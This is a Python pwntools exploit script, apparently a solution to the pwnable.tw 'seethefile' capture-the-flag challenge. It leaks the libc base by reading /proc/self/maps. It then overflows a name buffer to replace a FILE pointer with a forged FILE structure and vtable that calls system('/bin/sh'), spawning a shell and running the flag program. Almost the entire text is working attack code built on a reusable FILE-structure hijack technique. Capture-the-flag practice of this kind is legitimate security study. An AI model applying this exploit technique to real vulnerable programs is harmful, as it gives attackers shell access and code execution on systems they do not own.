#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 10200
HOST = "chall.pwnable.tw"
exe = context.binary = ELF('./seethefile_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.23.so', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b* 0x08048AE5
            b* 0x08048B0F
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def openfile(file):
    p.sendlineafter(b'choice :', str(1))
    p.sendlineafter(b'see :', file)

def readfile():
    p.sendlineafter(b'choice :', str(2))

def writefile():
    p.sendlineafter(b'choice :', str(3))

def closefile():
    p.sendlineafter(b'choice :', str(4))

def exit(name):
    p.sendlineafter(b'choice :', str(5))
    p.sendlineafter(b'name :', name)

# VARIABLE
name = 0x0804B260
fp = 0x0804B280
filename = 0x0804B080
rw_section = 0x804ba00
one_gadget = [0x3a819, 0x5f065, 0x5f066]

# PAYLOAD
openfile(b'/proc/self/maps')
readfile()
readfile()
writefile()

p.recvuntil(b'\n')
libc_leak = int(p.recvuntil(b'-', drop=True), 16)
libc.address = libc_leak
print("Libc base: " + hex(libc.address))

payload = flat(
    b'a'*0x20,
    fp + 4,
    b'/bin/sh\0'.ljust(0x38, b'a'), # _flags = fp + 4
    -1, # _fileno
    b'a'*0xc,
    rw_section, # lock
    name + 0x1b0 - 8 + 0xc, # vtable + 8
    b'a'*(0x94 - 0x4c - 4),
    name + 0x1b0,
    b'a'*0x100,
    libc.sym.system
    )
# GDB()
exit(payload)
p.sendline(b'cd /home/seethefile')
p.sendline(b'./get_flag')
p.sendafter(b'Your magic :', b'Give me the flag')

p.interactive()